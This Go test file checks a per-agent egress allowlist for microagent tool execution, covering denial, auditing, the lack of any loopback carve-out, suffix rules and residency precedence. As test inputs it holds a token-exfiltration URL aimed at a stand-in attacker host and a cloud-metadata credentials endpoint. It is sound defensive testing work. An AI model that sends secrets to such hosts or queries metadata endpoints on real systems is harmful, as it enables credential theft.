// egress_test.go — the acceptance witness for #2017 (per-agent egress control).
//
// The issue's acceptance is one sentence with three clauses, and each has a test
// here that fails if the clause regresses:
//
//	"An untrusted microagent cannot reach a non-allowlisted host"  -> TestEgressAcceptanceUntrustedCannotReachNonAllowlistedHost
//	"allowlist entries pass"                                       -> TestEgressAcceptanceAllowlistedHostPasses
//	"denial is audited"                                            -> both of the above assert the Audit sink + verdict Meta
//
// The rest of the file pins the three rules egress.go's header states, because
// each is a security property that a later refactor could quietly soften: no
// implicit loopback/link-local carve-out (rule 1), no subdomain wildcard at the
// untrusted pole (rule 2), and residency beating the allowlist (rule 3).
package microagent_test

import (
	"context"
	"errors"
	"strings"
	"sync/atomic"
	"testing"

	"github.com/anthony-chaudhary/fak/internal/abi"
	"github.com/anthony-chaudhary/fak/internal/microagent"
)

// allowFloor allows every call, so the EGRESS rung is the only thing that can
// refuse. Using a permissive floor is what makes a denial in these tests
// attributable: if the action does not run, the egress policy is why.
type allowFloor struct{}

func (allowFloor) Decide(context.Context, *abi.ToolCall) abi.Verdict {
	return abi.Verdict{Kind: abi.VerdictAllow, By: "test-allow-floor"}
}

// residencyFloor models the shape of the real residency / data-leak gate
// (internal/engine residencyGate, rank 12): the bare CALL is fine, but the same
// call ROUTED to an off-box engine is refused. egress.Decide re-submits the call
// with Engine set to the destination host, which is exactly how that gate gets to
// see an egress destination — so this fake exercises the real composition.
type residencyFloor struct{ denyRoute string }

func (f residencyFloor) Decide(_ context.Context, c *abi.ToolCall) abi.Verdict {
	if c != nil && c.Engine == f.denyRoute {
		return abi.Verdict{
			Kind:   abi.VerdictDeny,
			Reason: abi.ReasonDefaultDeny,
			By:     "test-residency-floor",
			Meta:   map[string]string{"residency": "tenant-scoped payload may not leave the box"},
		}
	}
	return abi.Verdict{Kind: abi.VerdictAllow, By: "test-residency-floor"}
}

// dispatchCount reads the shared spyBackend's counter (declared in
// toolexec_floor_conformance_test.go, where it already serves as the structural
// witness that adjudication precedes dispatch). A denial that still dispatched
// would be a policy that costs a process and protects nothing, so "did the
// backend run" is the load-bearing assertion here too, not the error alone.
func dispatchCount(b *spyBackend) int32 { return atomic.LoadInt32(&b.calls) }

// governedExec builds an executor whose ONLY refusal source is the egress policy,
// plus the audit log that policy writes to.
func governedExec(t *testing.T, floor microagent.KernelFloor, trust string, allow ...string) (*microagent.ToolExec, *spyBackend, *[]abi.Verdict) {
	t.Helper()
	be := &spyBackend{}
	tx, err := microagent.NewToolExecBackend(floor, be)
	if err != nil {
		t.Fatalf("NewToolExecBackend: %v", err)
	}
	pol, err := microagent.NewEgressPolicy(trust, allow...)
	if err != nil {
		t.Fatalf("NewEgressPolicy(%q, %v): %v", trust, allow, err)
	}
	audit := &[]abi.Verdict{}
	pol.Audit = func(v abi.Verdict) { *audit = append(*audit, v) }
	gov, err := tx.WithEgress(pol)
	if err != nil {
		t.Fatalf("WithEgress: %v", err)
	}
	return gov, be, audit
}

func reachHost(t *testing.T, tx *microagent.ToolExec, dest string) (microagent.ToolResult, error) {
	t.Helper()
	return tx.Run(context.Background(), microagent.ToolAction{
		Tool: "Fetch",
		Args: map[string]any{"url": dest},
		Path: "/bin/true",
		Dest: dest,
	})
}

// ACCEPTANCE clause 1 + 3: an untrusted microagent cannot reach a
// non-allowlisted host, and the denial is audited.
func TestEgressAcceptanceUntrustedCannotReachNonAllowlistedHost(t *testing.T) {
	tx, be, audit := governedExec(t, allowFloor{}, microagent.EgressTrustUntrusted, "api.example.com")

	res, err := reachHost(t, tx, "https://exfil.attacker.test/steal?token=sk-live")
	if !errors.Is(err, microagent.ErrEgressDenied) {
		t.Fatalf("Run(non-allowlisted) err = %v, want ErrEgressDenied", err)
	}
	// The refusal must cost ZERO processes: the seam denies BEFORE dispatch.
	if dispatchCount(be) != 0 {
		t.Errorf("backend dispatched %d times on a denied egress; want 0", dispatchCount(be))
	}
	if res.Ran {
		t.Errorf("result reports Ran=true for a denied action")
	}
	if res.Verdict.Kind != abi.VerdictDeny || res.Verdict.Reason != abi.ReasonDefaultDeny {
		t.Errorf("verdict = %v/%v, want Deny/DEFAULT_DENY", res.Verdict.Kind, abi.ReasonName(res.Verdict.Reason))
	}

	// "denial is audited" — recorded exactly once, naming the destination it
	// refused and the posture that decided.
	if len(*audit) != 1 {
		t.Fatalf("audit rows = %d, want exactly 1", len(*audit))
	}
	got := (*audit)[0]
	if got.Meta["egress_host"] != "exfil.attacker.test" {
		t.Errorf("audited egress_host = %q, want exfil.attacker.test", got.Meta["egress_host"])
	}
	if got.Meta["trust_level"] != microagent.EgressTrustUntrusted {
		t.Errorf("audited trust_level = %q, want untrusted", got.Meta["trust_level"])
	}
	if !strings.Contains(got.Meta["egress_dest"], "exfil.attacker.test") {
		t.Errorf("audited egress_dest = %q, want the full declared destination", got.Meta["egress_dest"])
	}
}

// ACCEPTANCE clause 2: allowlist entries pass — same executor, same policy.
func TestEgressAcceptanceAllowlistedHostPasses(t *testing.T) {
	tx, be, audit := governedExec(t, allowFloor{}, microagent.EgressTrustUntrusted, "api.example.com")

	for _, dest := range []string{
		"https://api.example.com/v1/chat", // URL form
		"api.example.com:443",             // host:port form
		"api.example.com",                 // bare host
		"API.Example.com.",                // case + trailing root dot must not fork the decision
	} {
		res, err := reachHost(t, tx, dest)
		if err != nil {
			t.Fatalf("Run(%q) = %v, want allow", dest, err)
		}
		if !res.Ran {
			t.Errorf("Run(%q): Ran=false, want the action to reach the backend", dest)
		}
	}
	if dispatchCount(be) != 4 {
		t.Errorf("backend dispatched %d times, want 4 (every allowlisted form)", dispatchCount(be))
	}
	// An ALLOW is not an audit event — only refusals are recorded.
	if len(*audit) != 0 {
		t.Errorf("audit rows = %d on allowed egress, want 0", len(*audit))
	}
}

// Rule 1 has NO implicit exemptions. Loopback and link-local are the classic
// SSRF/exfil targets (a sidecar on 127.0.0.1, cloud instance metadata at
// 169.254.169.254), so an "obviously local, obviously fine" carve-out would hand
// over exactly the hosts this floor exists to protect.
func TestEgressDefaultDenyHasNoLocalCarveOut(t *testing.T) {
	tx, be, _ := governedExec(t, allowFloor{}, microagent.EgressTrustUntrusted, "api.example.com")
	for _, dest := range []string{
		"http://127.0.0.1:8080/admin",
		"localhost:9000",
		"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
		"[::1]:22",
		"0.0.0.0",
	} {
		if _, err := reachHost(t, tx, dest); !errors.Is(err, microagent.ErrEgressDenied) {
			t.Errorf("Run(%q) err = %v, want ErrEgressDenied (no local carve-out)", dest, err)
		}
	}
	if dispatchCount(be) != 0 {
		t.Errorf("backend dispatched %d times for local destinations; want 0", dispatchCount(be))
	}
}

// Rule 2: at the untrusted pole a subdomain suffix is refused AT CONSTRUCTION —
// an attacker who controls a subdomain label picks `secret.example.com` and the
// allowlist waves the secret out in the hostname itself.
func TestEgressUntrustedRefusesSuffixAllowlist(t *testing.T) {
	if _, err := microagent.NewEgressPolicy(microagent.EgressTrustUntrusted, ".example.com"); !errors.Is(err, microagent.ErrEgressSuffix) {
		t.Fatalf("NewEgressPolicy(untrusted, \".example.com\") err = %v, want ErrEgressSuffix", err)
	}
	// An empty trust level normalizes to the untrusted pole — unknown provenance
	// is untrusted provenance, so it must inherit the same refusal.
	if _, err := microagent.NewEgressPolicy("", ".example.com"); !errors.Is(err, microagent.ErrEgressSuffix) {
		t.Fatalf("NewEgressPolicy(\"\", \".example.com\") err = %v, want ErrEgressSuffix", err)
	}
	// A TRUSTED level may still use a suffix, and it matches the domain itself
	// plus subdomains — but nothing outside it.
	tx, _, _ := governedExec(t, allowFloor{}, "trusted", ".example.com")
	for _, ok := range []string{"example.com", "api.example.com", "a.b.example.com"} {
		if _, err := reachHost(t, tx, ok); err != nil {
			t.Errorf("trusted suffix Run(%q) = %v, want allow", ok, err)
		}
	}
	for _, bad := range []string{"notexample.com", "example.com.evil.test"} {
		if _, err := reachHost(t, tx, bad); !errors.Is(err, microagent.ErrEgressDenied) {
			t.Errorf("trusted suffix Run(%q) err = %v, want ErrEgressDenied", bad, err)
		}
	}
}

// Rule 3 (issue scope item 3): residency wins over the allowlist. The operator
// allowlisted a DESTINATION, not a data-residency exception.
func TestEgressResidencyFloorOverridesAllowlist(t *testing.T) {
	tx, be, audit := governedExec(t, residencyFloor{denyRoute: "api.example.com"},
		microagent.EgressTrustUntrusted, "api.example.com")

	res, err := reachHost(t, tx, "https://api.example.com/v1/chat")
	if !errors.Is(err, microagent.ErrEgressDenied) {
		t.Fatalf("Run(allowlisted but residency-refused) err = %v, want ErrEgressDenied", err)
	}
	if dispatchCount(be) != 0 {
		t.Errorf("backend dispatched %d times; want 0", dispatchCount(be))
	}
	// The residency floor's OWN forensics survive — its By/Reason are the record,
	// with the egress destination merged in rather than overwriting them.
	if res.Verdict.By != "test-residency-floor" {
		t.Errorf("verdict By = %q, want the residency floor to be named as decider", res.Verdict.By)
	}
	if res.Verdict.Meta["residency"] == "" {
		t.Errorf("verdict Meta lost the residency floor's own row: %v", res.Verdict.Meta)
	}
	if res.Verdict.Meta["egress_host"] != "api.example.com" {
		t.Errorf("verdict Meta egress_host = %q, want the destination attached", res.Verdict.Meta["egress_host"])
	}
	if len(*audit) != 1 {
		t.Errorf("audit rows = %d, want 1 (a residency refusal is still an audited egress denial)", len(*audit))
	}
}

// The ungoverned legacy posture must be BIT-IDENTICAL to life before #2017:
// an executor with no policy attached runs an action that declares a destination.
func TestEgressUngovernedExecutorUnchanged(t *testing.T) {
	be := &spyBackend{}
	tx, err := microagent.NewToolExecBackend(allowFloor{}, be)
	if err != nil {
		t.Fatalf("NewToolExecBackend: %v", err)
	}
	if _, err := reachHost(t, tx, "https://anywhere.attacker.test/"); err != nil {
		t.Fatalf("ungoverned Run = %v, want the pre-#2017 pass-through", err)
	}
	if dispatchCount(be) != 1 {
		t.Errorf("ungoverned backend dispatched %d times, want 1", dispatchCount(be))
	}
}

// A governed executor still defers when the action declares NO destination —
// the floor decides destinations, it does not ban destination-less actions.
func TestEgressNoDeclaredDestinationDefers(t *testing.T) {
	tx, be, audit := governedExec(t, allowFloor{}, microagent.EgressTrustUntrusted, "api.example.com")
	res, err := tx.Run(context.Background(), microagent.ToolAction{
		Tool: "Read", Args: map[string]any{"path": "x"}, Path: "/bin/true",
	})
	if err != nil {
		t.Fatalf("Run(no Dest) = %v, want defer-and-proceed", err)
	}
	if !res.Ran || dispatchCount(be) != 1 {
		t.Errorf("Run(no Dest): Ran=%v dispatched=%d, want true/1", res.Ran, dispatchCount(be))
	}
	if len(*audit) != 0 {
		t.Errorf("audit rows = %d for an action with no destination, want 0", len(*audit))
	}
}

// WithEgress must COPY: attaching a policy cannot retroactively re-govern an
// executor another agent already holds, and nil must be refused loud rather than
// reading as "governed" at the call site while leaving the executor open.
func TestWithEgressCopiesAndRefusesNil(t *testing.T) {
	be := &spyBackend{}
	base, err := microagent.NewToolExecBackend(allowFloor{}, be)
	if err != nil {
		t.Fatalf("NewToolExecBackend: %v", err)
	}
	if _, err := base.WithEgress(nil); err == nil {
		t.Fatal("WithEgress(nil) = nil error, want a loud refusal")
	}
	pol, err := microagent.NewEgressPolicy(microagent.EgressTrustUntrusted, "api.example.com")
	if err != nil {
		t.Fatalf("NewEgressPolicy: %v", err)
	}
	gov, err := base.WithEgress(pol)
	if err != nil {
		t.Fatalf("WithEgress: %v", err)
	}
	if gov == base {
		t.Fatal("WithEgress returned the SAME executor; it must copy")
	}
	// The original is still ungoverned...
	if _, err := reachHost(t, base, "https://elsewhere.test/"); err != nil {
		t.Errorf("base executor became governed by a sibling's WithEgress: %v", err)
	}
	// ...and the copy is governed.
	if _, err := reachHost(t, gov, "https://elsewhere.test/"); !errors.Is(err, microagent.ErrEgressDenied) {
		t.Errorf("copied executor err = %v, want ErrEgressDenied", err)
	}
}

// Everything refusable is refused at CONSTRUCTION, so a malformed allowlist
// fails loud where the operator wrote it — never as a surprise allow later.
func TestNewEgressPolicyConstructionRefusals(t *testing.T) {
	if _, err := microagent.NewEgressPolicy(microagent.EgressTrustUntrusted); !errors.Is(err, microagent.ErrEgressNoAllowlist) {
		t.Errorf("empty allowlist err = %v, want ErrEgressNoAllowlist", err)
	}
	if _, err := microagent.NewEgressPolicy("trusted", "*"); !errors.Is(err, microagent.ErrEgressWildcard) {
		t.Errorf("wildcard err = %v, want ErrEgressWildcard (no open-egress escape hatch)", err)
	}
	for _, bad := range []string{"", "   ", "https://api.example.com", "api.example.com/v1", "api.example.com:443", "."} {
		if _, err := microagent.NewEgressPolicy("trusted", bad); err == nil {
			t.Errorf("NewEgressPolicy(trusted, %q) = nil error, want a refusal", bad)
		}
	}
	// A well-formed policy reports the posture that will actually decide.
	p, err := microagent.NewEgressPolicy("", "api.example.com")
	if err != nil {
		t.Fatalf("NewEgressPolicy: %v", err)
	}
	if p.TrustLevel() != microagent.EgressTrustUntrusted {
		t.Errorf("TrustLevel() = %q, want the empty level normalized to untrusted", p.TrustLevel())
	}
}

// A destination the floor cannot NAME is a refusal, not a pass: the allowlist
// cannot allow what it cannot resolve to a host.
func TestEgressUndecodableDestinationDenied(t *testing.T) {
	tx, be, audit := governedExec(t, allowFloor{}, microagent.EgressTrustUntrusted, "api.example.com")
	for _, bad := range []string{"http://", "https:// api.example.com", "not a host"} {
		res, err := reachHost(t, tx, bad)
		if !errors.Is(err, microagent.ErrEgressDenied) {
			t.Errorf("Run(%q) err = %v, want ErrEgressDenied", bad, err)
		}
		if res.Verdict.Reason != abi.ReasonMalformed {
			t.Errorf("Run(%q) reason = %v, want MALFORMED", bad, abi.ReasonName(res.Verdict.Reason))
		}
	}
	if dispatchCount(be) != 0 {
		t.Errorf("backend dispatched %d times on undecodable destinations; want 0", dispatchCount(be))
	}
	if len(*audit) != 3 {
		t.Errorf("audit rows = %d, want 3 (every refusal recorded)", len(*audit))
	}
}

func TestEgressHost(t *testing.T) {
	cases := []struct {
		dest string
		want string
		ok   bool
	}{
		{"https://api.example.com/v1/chat", "api.example.com", true},
		{"api.example.com:443", "api.example.com", true},
		{"api.example.com", "api.example.com", true},
		{"API.Example.COM.", "api.example.com", true},
		{"http://[::1]:8080/x", "::1", true},
		{"[2001:db8::1]", "2001:db8::1", true},
		{"", "", false},
		{"http://", "", false},
		{"not a host", "", false},
	}
	for _, tc := range cases {
		got, err := microagent.EgressHost(tc.dest)
		if (err == nil) != tc.ok {
			t.Errorf("EgressHost(%q) err = %v, want ok=%v", tc.dest, err, tc.ok)
			continue
		}
		if tc.ok && got != tc.want {
			t.Errorf("EgressHost(%q) = %q, want %q", tc.dest, got, tc.want)
		}
	}
}
